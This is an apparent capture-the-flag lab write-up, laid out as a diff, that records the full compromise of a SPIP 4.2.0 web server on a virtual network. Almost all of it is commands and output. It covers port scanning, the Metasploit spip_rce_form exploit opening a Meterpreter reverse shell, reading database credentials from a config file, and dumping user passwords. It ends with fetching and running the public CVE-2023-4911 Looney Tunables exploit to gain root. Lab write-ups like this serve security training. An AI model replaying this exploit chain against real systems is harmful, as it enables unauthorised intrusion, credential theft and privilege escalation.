@@ -1,0 +1,537 @@
+			      ENUMERATION
+
+			
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 12  bytes 3310 (3.2 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 49  bytes 5651 (5.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+
+
+---netdiscover---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+ 
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960              
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor              
+ 10.0.2.3        08:00:27:84:87:a5      4     240  PCS Systemtechnik GmbH      
+ 10.0.2.44       08:00:27:d1:67:7c      4     240  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                
+
+
+
+---nmap on our target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.44 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-28 17:19 +03
+Nmap scan report for 10.0.2.44
+Host is up (0.00075s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
+|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-generator: SPIP 4.2.0
+|_http-title: Mi sitio SPIP
+MAC Address: 08:00:27:D1:67:7C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.75 ms 10.0.2.44
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.76 seconds
+                  
+
+
+---we see open ssh and http ports, lets keep on enumerating---
+
+
+---I run dirb, gobuster and ctfenum scans, I find login page but other than that not much comes up---
+
+
+---I check the website manually and find that the website is made with spip---
+
+
+
+Spip: A system for publishing content on the internet
+
+
+
+---I check the internet for some exploits and turns out there modules for spip in msfconsole, lets use our big gun---
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# msfconsole                    
+Metasploit tip: Enable verbose logging with set VERBOSE true
+                                                  
+
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
+_______________________________________________________________   ,&$$$$$$'_____
+                                                                 ll&&$$$$'
+                                                              .;;lll&&&&'
+                                                            ...;;lllll&'
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+
+
+       =[ metasploit v6.4.3-dev                           ]
++ -- --=[ 2409 exploits - 1241 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search spip
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank       Check  Description
+   -  ----                                     ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/spip_connect_exec    2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
+   1  exploit/unix/webapp/spip_rce_form        2023-02-27       excellent  Yes    SPIP form PHP Injection
+   2    \_ target: Automatic (PHP In-Memory)   .                .          .      .
+   3    \_ target: Automatic (Unix In-Memory)  .                .          .      .
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/spip_rce_form
+After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Unix In-Memory)'
+
+msf6 > use 1
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/spip_rce_form) > show options
+
+Module options (exploit/unix/webapp/spip_rce_form):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:po
+                                         rt][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/
+                                         docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randoml
+                                         y generated)
+   TARGETURI  /                yes       The base path to SPIP application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This
+                                        must be an address on the local machine or 0.0.0.0 to
+                                        listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (PHP In-Memory)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/spip_rce_form) > set RHOSTS 10.0.2.44
+RHOSTS => 10.0.2.44
+msf6 exploit(unix/webapp/spip_rce_form) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf6 exploit(unix/webapp/spip_rce_form) > set target 0
+target => 0
+
+msf6 exploit(unix/webapp/spip_rce_form) > set LPORT 1234
+LPORT => 1234
+msf6 exploit(unix/webapp/spip_rce_form) > exploit -j
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.0.2.15:1234 
+[*] Running automatic check ("set AutoCheck false" to disable)
+msf6 exploit(unix/webapp/spip_rce_form) > [*] SPIP Version detected: 4.2.0
+[+] The target appears to be vulnerable.
+[*] Got anti-csrf token: iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
+[*] 10.0.2.44:80 - Attempting to exploit...
+[*] Sending stage (39927 bytes) to 10.0.2.44
+[*] Meterpreter session 1 opened (10.0.2.15:1234 -> 10.0.2.44:54770) at 2024-04-28 22:38:41 +0300
+sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information      Connection
+  --  ----  ----                   -----------      ----------
+  1         meterpreter php/linux  www-data @ pipy  10.0.2.15:1234 -> 10.0.2.44:54770 (10.0.2
+                                                    .44)
+
+msf6 exploit(unix/webapp/spip_rce_form) > sessions 1
+[*] Starting interaction with 1...
+
+
+
+
+
+			      GAINING FOOTHOLD
+			
+
+---we are in, lets upgrade our shell---
+
+
+meterpreter > shell
+Process 2746 created.
+Channel 0 created.
+
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@pipy:/var/www/html$ whoami
+www-data
+
+
+---now lets try to find the user flag and then look for a way to priv escalate---
+
+www-data@pipy:/tmp$ cd /home
+cd /home
+www-data@pipy:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root   root   4096 Oct  4  2023 .
+drwxr-xr-x 19 root   root   4096 Oct  2  2023 ..
+drwxr-x---  6 angela angela 4096 Oct 17  2023 angela
+www-data@pipy:/home$ cd angela
+cd angela
+bash: cd: angela: Permission denied
+
+
+
+---there is a user named angela, lets keep on looking---
+
+
+---I search around in home directory, couldn't find much, linpeas also doesn't give any result---
+
+
+---By manual searching I found a file in the /var/www/html/config/---
+
+
+www-data@pipy:/var/www/html/config$ ls -la
+ls -la
+total 48
+drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .
+drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
+-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess
+-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok
+-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php
+-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php
+-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php
+-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
+-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
+
+
+
+---I check all the files here and connect.php has some credentials for sql database---
+
+
+
+www-data@pipy:/var/www/html/config$ cat connect.php
+cat connect.php
+<?php
+if (!defined("_ECRIRE_INC_VERSION")) return;
+defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
+$GLOBALS['spip_connect_version'] = 0.8;
+spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
+
+			
+www-data@pipy:/var/www/html/config$ mysql -u root -p
+mysql -u root -p
+Enter password: dbpassword
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 1824
+Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| spip               |
+| sys                |
++--------------------+
+5 rows in set (0.005 sec)
+
+MariaDB [(none)]> use spip;
+use spip;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [spip]> show tables;
+show tables;
++-------------------------+
+| Tables_in_spip          |
++-------------------------+
+| spip_articles           |
+| spip_auteurs            |
+| spip_auteurs_liens      |
+| spip_depots             |
+| spip_depots_plugins     |
+| spip_documents          |
+| spip_documents_liens    |
+| spip_forum              |
+| spip_groupes_mots       |
+| spip_jobs               |
+| spip_jobs_liens         |
+| spip_meta               |
+| spip_mots               |
+| spip_mots_liens         |
+| spip_paquets            |
+| spip_plugins            |
+| spip_referers           |
+| spip_referers_articles  |
+| spip_resultats          |
+| spip_rubriques          |
+| spip_syndic             |
+| spip_syndic_articles    |
+| spip_types_documents    |
+| spip_urls               |
+| spip_versions           |
+| spip_versions_fragments |
+| spip_visites            |
+| spip_visites_articles   |
++-------------------------+
+28 rows in set (0.000 sec)
+
+	
+
+---when I try to dump all the info it shows them in a unorganized and unreadable way, instead we can work smart
+and get credentials this way---
+
+
+MariaDB [spip]> select id_auteur, nom, login, pass from spip_auteurs;
+select id_auteur, nom, login, pass from spip_auteurs;
++-----------+--------+--------+--------------------------------------------------------------+
+| id_auteur | nom    | login  | pass                                                         |
++-----------+--------+--------+--------------------------------------------------------------+
+|         1 | Angela | angela | 4ng3l4                                                       |
+|         2 | admin  | admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |
++-----------+--------+--------+--------------------------------------------------------------+
+2 rows in set (0.000 sec)
+
+
+
+---here we see the user angela's password and admin users password hash, lets login as angela---
+
+
+
+www-data@pipy:/var/www/html$ su angela
+su angela
+Password: 4ng3l4
+
+angela@pipy:/var/www/html$ cd /home
+cd /home
+angela@pipy:/home$ cd angela
+cd angela
+
+angela@pipy:~$ ls
+ls
+snap  user.txt
+angela@pipy:~$ cat user.txt
+cat user.txt
+---First User Flag---
+
+
+
+
+			
+			                              PRIVILEGE ESCALATION
+
+
+---We find the password hash of admin user in the database, I take note of it and try to crack the hash using
+john and hashcat but there is no use---
+
+
+---I keep on searching for other ways but can't find much---
+
+
+  
+---I search online and writeups for a possible solution, turns out there is this tool called Looney Tunables
+which is a poc exploiting a bug in glibc dynamic loader's GLIBC_TUNABLES environment variable parsing
+function parse_tunables()---
+
+
+---I go to the https://github.com/leesh3288/CVE-2023-4911 website to learn more about this
+exploit, we can run a command to see if this machine is vulnerable to this exploit---
+
+
+angela@pipy:~$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
+<fast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
+Segmentation fault (core dumped)
+
+
+
+---core dumped message means target is vulnerable, lets download this tool to priv escalate--- 
+
+
+https://github.com/leesh3288/CVE-2023-4911
+
+
+---to use it---
+
+
+
+angela@pipy:~$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
+
+<leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
+--2024-04-28 23:02:21--  https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
+Resolving github.com (github.com)... 140.82.121.3
+Connecting to github.com (github.com)|140.82.121.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://codeload.github.com/leesh3288/CVE-2023-4911/zip/refs/heads/main [following]
+--2024-04-28 23:02:21--  https://codeload.github.com/leesh3288/CVE-2023-4911/zip/refs/heads/main
+Resolving codeload.github.com (codeload.github.com)... 140.82.121.10
+Connecting to codeload.github.com (codeload.github.com)|140.82.121.10|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/zip]
+Saving to: ‘main.zip’
+
+main.zip                [ <=>                ]   2.97K  --.-KB/s    in 0s      
+
+2024-04-28 23:02:22 (57.9 MB/s) - ‘main.zip’ saved [3044]
+
+
+angela@pipy:~$ ls
+ls
+main.zip  snap  user.txt
+
+angela@pipy:~$ unzip main.zip
+unzip main.zip
+Archive:  main.zip
+acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
+   creating: CVE-2023-4911-main/
+  inflating: CVE-2023-4911-main/Makefile  
+  inflating: CVE-2023-4911-main/README.md  
+  inflating: CVE-2023-4911-main/exp.c  
+  inflating: CVE-2023-4911-main/gen_libc.py  
+angela@pipy:~$ cd C	
+cd CVE-2023-4911-main/
+
+
+
+---now just use make command and play the waiting game---
+
+
+angela@pipy:~/CVE-2023-4911-main$ make
+make
+gcc -o exp exp.c
+python3 gen_libc.py
+Warning: _curses.error: setupterm: could not find terminfo database
+
+Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/angela/.cache/.pwntools-cache-3.10/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] A newer version of pwntools is available on pypi (4.11.0 --> 4.12.0).
+    Update with: $ pip install -U pwntools
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+./exp
+try 100
+try 200
+
+#
+
+---you know what that symbol means :)---
+
+
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+root.txt  snap
+# cat root.txt
+cat root.txt
+---Root User Flag---
+
+
